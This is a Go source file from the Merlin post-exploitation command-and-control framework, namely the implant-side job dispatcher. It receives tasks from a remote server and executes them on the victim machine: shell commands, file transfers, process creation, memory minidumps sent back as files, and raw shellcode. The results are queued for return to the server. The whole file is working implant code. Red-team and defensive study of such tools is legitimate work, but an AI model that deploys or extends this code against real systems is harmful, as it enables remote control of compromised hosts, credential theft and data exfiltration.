// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2021  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package agent

import (
	// Standard
	"fmt"
	"strings"

	// Internal
	"github.com/Ne0nd0g/merlin/pkg/agent/cli"
	"github.com/Ne0nd0g/merlin/pkg/agent/commands"
	"github.com/Ne0nd0g/merlin/pkg/jobs"
	"github.com/Ne0nd0g/merlin/pkg/messages"
)

var jobsIn = make(chan jobs.Job, 100)  // A channel of input jobs for the agent to handle
var jobsOut = make(chan jobs.Job, 100) // A channel of output job results for the agent to send back to the server

func init() {
	// Start go routine that checks for jobs or tasks to execute
	go executeJob()
}

// executeJob is executed a go routine that regularly checks for jobs from the in channel, executes them, and returns results to the out channel
func executeJob() {
	for {
		var result jobs.Results
		job := <-jobsIn
		// Need a go routine here so that way a job or command doesn't block
		go func(job jobs.Job) {
			switch job.Type {
			case jobs.CMD:
				result = commands.ExecuteCommand(job.Payload.(jobs.Command))
			case jobs.FILETRANSFER:
				if job.Payload.(jobs.FileTransfer).IsDownload {
					result = commands.Download(job.Payload.(jobs.FileTransfer))
				} else {
					ft, err := commands.Upload(job.Payload.(jobs.FileTransfer))
					if err != nil {
						result.Stderr = err.Error()
					}
					jobsOut <- jobs.Job{
						AgentID: job.AgentID,
						ID:      job.ID,
						Token:   job.Token,
						Type:    jobs.FILETRANSFER,
						Payload: ft,
					}
				}
			case jobs.MODULE:
				switch strings.ToLower(job.Payload.(jobs.Command).Command) {
				case "createprocess":
					result = commands.CreateProcess(job.Payload.(jobs.Command))
				case "minidump":
					ft, err := commands.MiniDump(job.Payload.(jobs.Command))
					if err != nil {
						result.Stderr = err.Error()
					}
					jobsOut <- jobs.Job{
						AgentID: job.AgentID,
						ID:      job.ID,
						Type:    jobs.FILETRANSFER,
						Payload: ft,
					}
				default:
					result.Stderr = fmt.Sprintf("unknown module command: %s", job.Payload.(jobs.Command).Command)
				}
			case jobs.NATIVE:
				result = commands.Native(job.Payload.(jobs.Command))
			case jobs.SHELLCODE:
				result = commands.ExecuteShellcode(job.Payload.(jobs.Shellcode))
			default:
				result.Stderr = fmt.Sprintf("Invalid job type: %d", job.Type)
			}
			jobsOut <- jobs.Job{
				AgentID: job.AgentID,
				ID:      job.ID,
				Token:   job.Token,
				Type:    jobs.RESULT,
				Payload: result,
			}
		}(job)
	}
}

// getJobs extracts any jobs from the channel that are ready to returned to server and packages them up into a Merlin message
func getJobs() messages.Base {
	msg := messages.Base{
		Version: 1.0,
	}

	// Check the output channel
	var returnJobs []jobs.Job
	for {
		if len(jobsOut) > 0 {
			job := <-jobsOut
			returnJobs = append(returnJobs, job)
		} else {
			break
		}
	}

	if len(returnJobs) > 0 {
		msg.Type = messages.JOBS
		msg.Payload = returnJobs
	} else {
		// There are 0 jobs results to return, just checkin
		msg.Type = messages.CHECKIN
	}
	return msg
}

// jobHandler takes a list of jobs and places them into job channel if they are a valid type
func (a *Agent) jobHandler(Jobs []jobs.Job) {
	cli.Message(cli.DEBUG, "Entering into agent.jobHandler() function")
	for _, job := range Jobs {
		// If the job belongs to this agent
		if job.AgentID == a.ID {
			cli.Message(cli.SUCCESS, fmt.Sprintf("%s job type received!", jobs.String(job.Type)))
			switch job.Type {
			case jobs.FILETRANSFER:
				jobsIn <- job
			case jobs.CONTROL:
				a.control(job)
			case jobs.CMD:
				jobsIn <- job
			case jobs.MODULE:
				jobsIn <- job
			case jobs.SHELLCODE:
				cli.Message(cli.NOTE, "Received Execute shellcode command")
				jobsIn <- job
			case jobs.NATIVE:
				jobsIn <- job
			default:
				var result jobs.Results
				result.Stderr = fmt.Sprintf("%s is not a valid job type", messages.String(job.Type))
				jobsOut <- jobs.Job{
					ID:      job.ID,
					AgentID: a.ID,
					Token:   job.Token,
					Type:    jobs.RESULT,
					Payload: result,
				}
			}
		}
	}
}
